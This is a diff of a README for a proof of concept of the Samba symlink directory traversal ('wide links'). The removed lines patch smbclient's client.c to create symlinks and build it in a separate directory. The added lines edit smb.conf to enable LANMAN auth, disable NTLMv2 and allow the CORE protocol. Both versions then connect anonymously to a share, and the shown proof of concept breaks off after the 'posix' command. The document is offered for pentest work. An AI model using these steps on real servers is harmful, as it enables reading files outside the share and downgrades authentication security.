@@ -10,62 +10,40 @@ Administrators should be careful and set 'wide links = no' in the '[global]' sec
  
 A proof of concept of Symlink Directory Traversal on Samba, here i will explain how to install the smbclient on an external location to use for the exploitation and also what to change.
 
-The original Manually exploitation explained in the link ( https://www.exploit-db.com/exploits/33599) doesn't work without adding an other code line in the client.c
-
-### First step
-
-We have to download a samba source code from the forge, i used the version 3.4.5, here you can find the download link ( https://download.samba.org/pub/samba/stable/)
+The original Manually exploitation explained in the link ( https://www.exploit-db.com/exploits/33599) doesn't work without adding an below lines on exiting smbconfig file..
 
 ```
-$ tar -xvzf samba-3.4.5.tar.gz
-$ cd samba-3.4.5/source3/client/
-```
-	
+check smb config info
 
-### Modification of client.c
+$ testparm
 
-You have to modify this file like in the url  ( https://www.exploit-db.com/exploits/33599) and also adding the line like below :
-
-*************
-	targetname = talloc_asprintf(ctx,"%s",buf);   // Add this to remove the prepending //host/share 
-	if (!cli_unix_symlink(targetcli, targetname, newname)) {
-		d_printf("%s symlinking files (%s -> %s)\n",
-			cli_errstr(targetcli), newname, targetname);
-		return 1;
-	}
-**********************
-
-### New client.c file
-
-You can replace the old client.c with the new one [here](https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually/blob/master/client.c)
-
-### Install Package externally to use for your pentest tests
-
-In my case i want to use this  smb client modified version just for my pentest tests, so the idea is to install it in a directory instead of a global installation.
-
-We will use the configure file to create our Makefile with the dir installation location like :
-```
-$ cd samba-3.4.5/source3/
-$ ./configure --prefix=/path/to/destination/directory/installation
-$ make && make install
-$ cd /path/to/destination/directory/installation/bin
+Load smb config files from /etc/samba/smb.conf
 ```
 
-We have to specify the library location in our bash env like :
+then first take backup of exisitng smb.conf file 
 
 ```
-$ export LD_LIBRARY_PATH="/path/to/destination/directory/installation/lib:$LD_LIBRARY_PATH"
+cp smb.conf smb.conf.bak
 ```
-And finnaly run smbclent :
+
+add below lines
 
 ```
-$ ./smbclient //192.169.1.12/Share_Name -N
+client lanman auth = yes
+client ntlmv2 auth = no
+client min protocol = CORE
+client max protocol = SMB3
+```
+Try to connect 
+
+```
+$ ./smbclient //10.1.1.136/Share_Name -N
 
 ```
 ### Proof of concept
 
 ```
-$ ./smbclient //192.169.1.12/Share_Name -N
+$ ./smbclient //10.1.1.136/Share_Name -N
 
 smb: \> posix
 Server supports CIFS extensions 1.0
